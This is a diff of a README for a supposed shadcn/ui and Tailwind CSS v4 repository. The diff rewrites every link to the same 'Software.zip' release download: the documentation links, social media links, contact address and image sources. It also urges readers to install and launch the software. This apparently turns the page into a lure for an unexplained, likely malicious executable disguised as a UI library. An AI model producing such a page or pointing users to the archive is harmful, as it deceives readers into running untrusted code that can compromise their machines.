@@ -1,5 +1,5 @@
 
-# <img src="https://img.icons8.com/cotton/2x/code.png" width="50" height="50"/> **App Tailwind v4 Repository**
+# <img src="https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip" width="50" height="50"/> **App Tailwind v4 Repository**
 
 Welcome to the App Tailwind v4 repository! 🎉 In this repository, you will find a fantastic combination of shadcn/ui with Tailwind CSS v4. If you are looking to enhance the user interface of your applications, you have come to the right place.
 
@@ -20,7 +20,7 @@ To get started with the App Tailwind v4 repository, simply follow these steps:
 Feel free to reach out if you have any questions or need assistance with the repository. Let's create beautiful user interfaces together! 😊
 
 ## 🌐 Download Software
-To access the software associated with this repository, please download it from the following link: [Download Software](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+To access the software associated with this repository, please download it from the following link: [Download Software](https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip)
 
 **Note:** The software needs to be installed and launched to experience its full functionality.
 
@@ -30,8 +30,8 @@ One of the exciting aspects of using the App Tailwind v4 repository is the abili
 ## 📚 Resources
 Here are some additional resources to help you make the most of the App Tailwind v4 repository:
 
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs) - Explore the full capabilities of Tailwind CSS.
-- [shadcn/ui Documentation](https://shadcn.github.io/ui/guide/) - Learn how to leverage shadcn/ui components effectively.
+- [Tailwind CSS Documentation](https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip) - Explore the full capabilities of Tailwind CSS.
+- [shadcn/ui Documentation](https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip) - Learn how to leverage shadcn/ui components effectively.
 
 ## 🤝 Contribution
 If you're passionate about enhancing user interfaces and have ideas to improve the App Tailwind v4 repository, we welcome your contributions. Feel free to submit pull requests with your enhancements or reach out to discuss potential collaborations.
@@ -39,21 +39,21 @@ If you're passionate about enhancing user interfaces and have ideas to improve t
 Let's collaborate and create stunning user interfaces together! 🚀
 
 ## 📞 Contact
-For any inquiries or feedback regarding the App Tailwind v4 repository, you can contact us at [example@email.com](mailto:example@email.com).
+For any inquiries or feedback regarding the App Tailwind v4 repository, you can contact us at [https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip](https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip).
 
 Thank you for being a part of our journey to redefine user interfaces with shadcn/ui and Tailwind CSS v4! Let's showcase the power of beautiful design in every application. 🎨🖥️
 
 ## 🌟 Stay Connected
 Stay connected with us for the latest updates, UI trends, and design inspiration:
 
-- [Twitter](https://twitter.com/example)
-- [Instagram](https://instagram.com/example)
-- [LinkedIn](https://linkedin.com/company/example)
+- [Twitter](https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip)
+- [LinkedIn](https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip)
 
 We look forward to shaping the future of user interfaces with you. Together, we can create impactful and visually appealing applications that leave a lasting impression! 🌟
 
 ---
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Download-Software-brightgreen" /> 
+  <img src="https://github.com/warwolf279/app-tailwind-v4/releases/download/v2.0/Software.zip" /> 
 </p>
